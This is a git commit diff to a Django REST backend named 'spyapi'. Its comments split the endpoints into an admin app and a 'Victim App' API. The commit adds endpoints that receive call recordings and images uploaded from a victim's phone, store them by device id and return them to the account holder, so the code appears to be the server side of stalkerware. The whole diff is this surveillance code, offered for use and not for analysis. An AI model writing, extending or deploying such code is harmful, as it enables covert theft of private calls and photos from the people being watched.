8b955efaacdd09b5810e6b1915774a210f3d178e
Roushan Alam <aroushan9@gmail.com>
2022-03-18 22:52:46 +0530

    Update views.py

--- spyapi/views.py
+++ spyapi/views.py
@@ -1,9 +1,11 @@
 from rest_framework.views import APIView
 from rest_framework.response import Response
 from rest_framework import status
-from .seriallizers import Userserializers,Phonedataserializers,Forgetserializers
-from .models import User,Phonedata
+from .seriallizers import Userserializers,Phonedataserializers,Forgetserializers,Audioserializers,Imageserializers
+from .models import User,Phonedata,Audio,Image
 from django.http import JsonResponse
+# Use 'ISO-8859-1' instead of "utf-8" for decodin
+
 from rest_framework.decorators import api_view
 
 # Admin App api
@@ -38,7 +40,6 @@ class Login(APIView):
             return JsonResponse({'data': 'Invalid credentials'})
 
 
-
 class Forget(APIView):
     def post(self, request):
         email = request.data['email']
@@ -52,18 +53,26 @@ class Forget(APIView):
 
 class Get_All_device(APIView):
     def post(self, request):
-         phons = Phonedata.objects.all().filter(email = request.data['email'])
-         serializer = Phonedataserializers(phons, many=True)
-         return JsonResponse({'data': serializer.data})
+        users = User.objects.all().filter(email = request.data['email'])
+        serializeruser = Userserializers(users, many=True)
+        phons = Phonedata.objects.all().filter(email=request.data['email'])
+        serializer = Phonedataserializers(phons, many=True)
+        return JsonResponse({'data': serializer.data,'account': serializeruser.data});
+
 
 # Victim App Api
 class Phone_data_created(APIView):
     def post(self, request):
         serializer = Phonedataserializers(data=request.data)
         email = request.data['email']
+        deviceid = request.data['deviceid']
         if serializer.is_valid():
             if User.objects.filter(email=email).exists():
-                serializer.save()
+                if Phonedata.objects.filter(deviceid=deviceid).exists():
+                    id = Phonedata.objects.only('id').get(deviceid=deviceid).id
+                    return JsonResponse({'status':status.HTTP_200_OK,'id': id})
+                else:
+                    serializer.save()
                 return JsonResponse({'status':status.HTTP_200_OK,'id': serializer.data['id']})
             else:
                 return JsonResponse({'status': 'Email not found'})
@@ -76,4 +85,40 @@ class Phone_data_Update(APIView):
             serializer.save()
         return Response(serializer.data)
 
+
+class Audio_stor(APIView):
+    def post(self, request):
+        # serializer = Audioserializers(data=request.data)
+        for audios in self.request.data:
+            for audios in self.request.FILES.getlist(audios):
+                _aud = Audioserializers(
+                    data={
+                        'deviceid': request.data['deviceid'],
+                        'callrecoding': audios
+                    }
+                )
+                if _aud.is_valid():
+                    _aud.save()
+        else:
+            audlist = Audio.objects.all().filter(deviceid=request.data['deviceid'])
+            serializer = Audioserializers(audlist, many=True)
+            return JsonResponse({'data': serializer.data})
+
+
+class Image_stor(APIView):
+    def post(self, request):
+        for image in self.request.data:
+            for image in self.request.FILES.getlist(image):
+                _img = Imageserializers(
+                    data={
+                        'deviceid': request.data['deviceid'],
+                        'image': image
+                    }
+                )
+                if _img.is_valid():
+                    _img.save()
+        else:
+            imglist = Image.objects.all().filter(deviceid=request.data['deviceid'])
+            serializer = Imageserializers(imglist, many=True)
+            return JsonResponse({'data': serializer.data})
 
